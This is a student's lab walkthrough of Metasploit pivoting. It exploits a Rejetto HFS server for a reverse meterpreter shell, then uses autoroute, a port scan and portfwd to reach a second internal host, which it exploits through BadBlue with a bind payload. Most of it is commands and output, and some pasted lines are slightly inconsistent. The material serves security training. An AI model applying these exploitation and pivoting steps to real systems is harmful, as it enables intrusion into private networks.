# Pivoting

Pivoting is a post exploitation technique that involves utilizing a compromised host to attack other systems on the compromised host's private internal network.

`Meterpreter` provides us with the ability to add a network route to the internal network subnet and consequently scan and exploit other system

*********************************************************************************************************************************************************
1. Identifying inaccessible machine/target on internal network (in this lab we are already given another machine victim 2)

2. Exploiting the vulnerability on target which we already have access to.

3. Since the targtet on internal network is on same subnet, we add route to msfconsole to do a port scan on machine in internal network which is not accessble directly

4. Portscanning and finding available port on inaccessible target withing internal network

5. Now doing portforwarding to the port found in portscanning in order to do a nmap service scan, since we can't do a nmap scan directly or by auxilary module just by `adding route`

6. Just to do the nmap service scan we do `portforwarding`

7. Once we know the vulnerable service running, we can exploit it by metaploit module and the exploit will work since we have route addedd to msfconsole, no need to specify forwarded port in this case, we can simply give victim 2 IP and vulnerable service port

`Thing to note here was that we had to do portforwarding to do a service scan but to do port scan and exploitation we were simply able to do it just by adding route`

*********************************************************************************************************************************************************
# In this lab we have two IPs victim 1 and victim 2, we are able to connect with victim1 but not victim2
Victim Machine 1 : 10.5.26.149
Victim Machine 2 : 10.5.31.52

root@attackdefense:~# `ping 10.5.26.149`
PING 10.5.26.149 (10.5.26.149) 56(84) bytes of data.
64 bytes from 10.5.26.149: icmp_seq=1 ttl=125 time=2.22 ms
64 bytes from 10.5.26.149: icmp_seq=2 ttl=125 time=1.56 ms
64 bytes from 10.5.26.149: icmp_seq=3 ttl=125 time=1.59 ms
^C
--- 10.5.26.149 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 1.562/1.791/2.223/0.305 ms
root@attackdefense:~# `ping 10.5.31.52 `
PING 10.5.31.52 (10.5.31.52) 56(84) bytes of data.
^C
--- 10.5.31.52 ping statistics ---
18 packets transmitted, 0 received, 100% packet loss, time 17390ms

root@attackdefense:~# 


# Lets start with metasploit to exploit and get initial acces to victim machine 1
root@attackdefense:~# `service postgresql start && msfconsole`

msf6 > `workspace -a pivoting`
[*] Added workspace: pivoting
[*] Workspace: pivoting
msf6 > `db_nmap 10.5.26.149 -sV`
[*] Nmap: Starting Nmap 7.91 ( https://nmap.org ) at 2024-01-06 12:11 IST
[*] Nmap: Nmap scan report for 10.5.26.149
[*] Nmap: Host is up (0.0014s latency).
[*] Nmap: Not shown: 989 closed ports
[*] Nmap: PORT      STATE SERVICE            VERSION
[*] Nmap: 80/tcp    open  http               HttpFileServer httpd 2.3
[*] Nmap: 135/tcp   open  msrpc              Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
[*] Nmap: 3389/tcp  open  ssl/ms-wbt-server?
[*] Nmap: 49152/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49155/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49165/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49176/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 70.85 seconds
msf6 > `search rejetto`

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

msf6 > `use 0`
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > `set RHOSTS 10.5.26.149`
RHOSTS => 10.5.26.149
msf6 exploit(windows/http/rejetto_hfs_exec) > `run`

[*] Started reverse TCP handler on 10.10.19.2:4444 
[*] Using URL: http://0.0.0.0:8080/LFDCzrm8AavTH9
[*] Local IP: http://10.10.19.2:8080/LFDCzrm8AavTH9
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /LFDCzrm8AavTH9
[*] Sending stage (175174 bytes) to 10.5.26.149
[!] Tried to delete %TEMP%\earAjLdtVZgrQ.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.19.2:4444 -> 10.5.26.149:49238) at 2024-01-06 12:14:19 +0530
[*] Server stopped.

meterpreter > `sysinfo`
Computer        : WIN-OMCNBKR66MN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > 


# List out the interfaces available, now since we know that Victim Machine 2 : `10.5`.31.52 is part of same subnet that of Victim Machine 1 : `10.5`.26.149


meterpreter > `ipconfig`

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 12
============
Name         : AWS PV Network Device #0
Hardware MAC : 02:a0:b8:57:96:bf
MTU          : 9001
IPv4 Address : 10.5.26.149
IPv4 Netmask : 255.255.240.0
IPv6 Address : fe80::445a:6756:d02a:ac76
IPv6 Netmask : ffff:ffff:ffff:ffff::


Interface 24
============
Name         : Microsoft ISATAP Adapter #2
Hardware MAC : 00:00:00:00:00:00
MTU          : 1280
IPv6 Address : fe80::5efe:a05:1a95
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff

meterpreter > 


# Now as we have IPv4 Netmask : 255.255.240.0, we can add a route to the network subnet 10.5.26.0/20, The `autoroute` post module creates a new route through a Meterpreter sessions allowing you to pivot deeper into a target network

meterpreter > `run autoroute -s 10.5.26.0/20`

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 10.5.26.0/255.255.240.0...
[+] Added route to 10.5.26.0/255.255.240.0 via 10.5.26.149
[*] Use the -p option to list all active routes
meterpreter > 

# Lets now background this session and rename it to victim-1 session, for us to easy understand

meterpreter > 
Background session 1? [y/N]  
msf6 exploit(windows/http/rejetto_hfs_exec) > `sessions`

Active sessions
===============

  Id  Name  Type                  Information            Connection
  --  ----  ----                  -----------            ----------
  1         meterpreter x86/wind  WIN-OMCNBKR66MN\Admin  10.10.19.2:4444 -> 10
            ows                   istrator @ WIN-OMCNBK  .5.26.149:49238 (10.5
                                  R66MN                  .26.149)

msf6 exploit(windows/http/rejetto_hfs_exec) > `sessions -n victim-1 -i 1`
[*] Session 1 named to victim-1
msf6 exploit(windows/http/rejetto_hfs_exec) > `sessions`

Active sessions
===============

  Id  Name      Type                 Information          Connection
  --  ----      ----                 -----------          ----------
  1   victim-1  meterpreter x86/win  WIN-OMCNBKR66MN\Adm  10.10.19.2:4444 -> 1
                dows                 inistrator @ WIN-OM  0.5.26.149:49238 (10
                                     CNBKR66MN            .5.26.149)

msf6 exploit(windows/http/rejetto_hfs_exec) > 

# Now since we have addedd route to the subnet,  we can now utilise portscan module

# `NOTE - Addiing route wont allow you to execute anythin other than metasloit modules,  so its not like we can do nmap scan on victim 2 just by adding route, but instead we can user modules like portscan etc`

msf6 exploit(windows/http/rejetto_hfs_exec) > `search portscan`

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/portscan/ftpbounce                               normal  No     FTP Bounce Port Scanner
   1  auxiliary/scanner/natpmp/natpmp_portscan                           normal  No     NAT-PMP External Port Scanner
   2  auxiliary/scanner/sap/sap_router_portscanner                       normal  No     SAPRouter Port Scanner
   3  auxiliary/scanner/portscan/xmas                                    normal  No     TCP "XMas" Port Scanner
   4  auxiliary/scanner/portscan/ack                                     normal  No     TCP ACK Firewall Scanner
   5  auxiliary/scanner/portscan/tcp                                     normal  No     TCP Port Scanner
   6  auxiliary/scanner/portscan/syn                                     normal  No     TCP SYN Port Scanner
   7  auxiliary/scanner/http/wordpress_pingback_access                   normal  No     Wordpress Pingback Locator


Interact with a module by name or index. For example info 7, use 7 or use auxiliary/scanner/http/wordpress_pingback_access

msf6 exploit(windows/http/rejetto_hfs_exec) > 

# Lets do portsan on Victim 2 machine

msf6 exploit(windows/http/rejetto_hfs_exec) > `use auxiliary/scanner/portscan/tcp`
msf6 auxiliary(scanner/portscan/tcp) > `options`

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to c
                                           heck per host
   DELAY        0                yes       The delay between connections, per
                                           thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum va
                                           lue by which to +/- DELAY) in milli
                                           seconds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-90
                                           0)
   RHOSTS                        yes       The target host(s), range CIDR iden
                                           tifier, or hosts file with syntax '
                                           file:<path>'
   THREADS      1                yes       The number of concurrent threads (m
                                           ax one per host)
   TIMEOUT      1000             yes       The socket connect timeout in milli
                                           seconds

msf6 auxiliary(scanner/portscan/tcp) > `set RHOSTS 10.5.31.52`
RHOSTS => 10.5.31.52
msf6 auxiliary(scanner/portscan/tcp) > `set PORTS 1-100`
PORTS => 1-100
msf6 auxiliary(scanner/portscan/tcp) > `exploit`

[+] 10.5.31.52:           - 10.5.31.52:80 - TCP OPEN
[*] 10.5.31.52:           - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/portscan/tcp) > 

# We observe that we have port 80 open on victim 2, but we still cant access it directly, Even If we try to use an auxilliary module to scan version it will not work

msf6 auxiliary(scanner/portscan/tcp) > `use auxiliary/scanner/http/http_version`
msf6 auxiliary(scanner/http/http_version) > `set RHOSTS 10.5.31.52`
RHOSTS => 10.5.31.52
msf6 auxiliary(scanner/http/http_version) > `run`

[+] 10.5.31.52:80 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/http_version) > 

# `So What we can do now`- To perform a Nmap scan we will need to `Forward port 80 on victim 2 to a port on our local host which is the kali linux instance`
********************************************************************************************************************************************************

# PORT FORWARDING
Basically Port forwarding allows computer over internet to connect specief computer or service within a private network, its basically enableing your computer to access the internet even though you are behind router.

For example someone from internet wants to RDP into your machine in your private home network, so he sends request with your public router ip and port 3389
Now in order to allow router connect it to your machine open port 3389, you need to configure port forwarding on it

Similary like in this situation when we want external machine/localhost to do nmap scan on machine in privatre network, we first do port forwarding of port 80 to our localhost port 1234

so now when we will be doing nmap scan on localhost port 1234 it will redirect the scan to port 80 of internal network machine ie victim 2 machine

Note that we already have routing enabled on internal network subnet by `autoroute` just like a home router!!

**********************************************************************************************************************************************
# To Do that we need to got to our session and specify `-l` the local port that we want to perform port forwarding on, `so if we want to forward port 80 of victim 2 to port 1234 on vctim 1 then we can specify like below` with victim2 ip address (-r)

msf6 auxiliary(scanner/http/http_version) > `sessions 1`
[*] Starting interaction with victim-1...

meterpreter > `portfwd add -l 1234 -p 80 -r 10.5.31.52`
[*] Local TCP relay created: :1234 <-> 10.5.31.52:80
meterpreter > 

# So basically since we cant do nmap scan on victim 2 port 80, we did portforwarding from its port 80 to port 1234 of victim 1, 
# `Now we can do nmap scan by specifying port 1234 and kali linux ip/localhost which will eventually do nmap scan for port 80 of victim 2 machine`

(My lab got auto-shut so from here will continue with new ip below but that dosent make any change in concepts)
Victim Machine 1 : 10.5.16.227
Victim Machine 2 : 10.5.23.99

sf6 exploit(windows/http/rejetto_hfs_exec) > `db_nmap -p 1234 -sS -sV localhost`
[*] Nmap: Starting Nmap 7.91 ( https://nmap.org ) at 2024-01-06 13:11 IST
[*] Nmap: Nmap scan report for localhost (127.0.0.1)
[*] Nmap: Host is up (0.00026s latency).
[*] Nmap: Other addresses for localhost (not scanned): ::1
[*] Nmap: PORT     STATE SERVICE VERSION
[*] Nmap: 1234/tcp open  http    BadBlue httpd 2.7
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 16.64 seconds
msf6 exploit(windows/http/rejetto_hfs_exec) > 

# The only reason we did port forwarding is to know the service running on port 80 of victim 2, which we noiw know is badblue

msf6 exploit(windows/http/rejetto_hfs_exec) > `use 1`
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/badblue_passthru) > `options`

Module options (exploit/windows/http/badblue_passthru):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[
                                       ,type:host:port][...]
   RHOSTS                    yes       The target host(s), range CIDR identifi
                                       er, or hosts file with syntax 'file:<pa
                                       th>'
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connecti
                                       ons
   VHOST                     no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thr
                                        ead, process, none)
   LHOST     10.10.19.2       yes       The listen address (an interface may b
                                        e specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   BadBlue EE 2.7 Universal


msf6 exploit(windows/http/badblue_passthru) > 

# we can't have a `reverse_tcp` payload we instead need to set `bind_tcp` payload, now while exploiting we dont need to mentioned port as 1234 and host as localhost because we already have route addedd within msfconsole

since we already a session on port 4444 we will listen this session on diffrent port

msf6 exploit(windows/http/badblue_passthru) > `set payload windows/meterpreter/bind_tcp`
payload => windows/meterpreter/bind_tcp
msf6 exploit(windows/http/badblue_passthru) > `set payload windows/meterpreter/bind_tcp`
RHOST => 10.5.17.176
msf6 exploit(windows/http/badblue_passthru) > `set LPORT 4433`
LPORT => 4433
msf6 exploit(windows/http/badblue_passthru) > `exploit`

[*] Trying target BadBlue EE 2.7 Universal...
[*] Started bind TCP handler against 10.5.17.176:4433
[*] Sending stage (175174 bytes) to 10.5.17.176
[*] Meterpreter session 2 opened (10.5.19.62:49293 -> 10.5.17.176:4433) at 2024-01-06 14:23:51 +0530

meterpreter > 

# So now we have tow sessions one each for each victim

msf6 exploit(windows/http/badblue_passthru) > `sessions -n victim-2 -i 2`
[*] Session 2 named to victim-2
msf6 exploit(windows/http/badblue_passthru) > `sessions`

Active sessions
===============

  Id  Name      Type                 Information          Connection
  --  ----      ----                 -----------          ----------
  1   vitcim-1  meterpreter x86/win  WIN-OMCNBKR66MN\Adm  10.10.19.2:4444 -> 1
                dows                 inistrator @ WIN-OM  0.5.19.62:49206 (10.
                                     CNBKR66MN            5.19.62)
  2   victim-2  meterpreter x86/win  ATTACKDEFENSE\Admin  10.5.19.62:49293 ->
                dows                 istrator @ ATTACKDE  10.5.17.176:4433 (10
                                     FENSE                .5.17.176)

msf6 exploit(windows/http/badblue_passthru) > `sessions 1`
[*] Starting interaction with vitcim-1...

meterpreter > `sysinfo`
Computer        : WIN-OMCNBKR66MN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > 
Background session vitcim-1? [y/N]  
msf6 exploit(windows/http/badblue_passthru) > `sessions 2`
[*] Starting interaction with victim-2...

meterpreter > `sysinfo`
Computer        : ATTACKDEFENSE
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > 

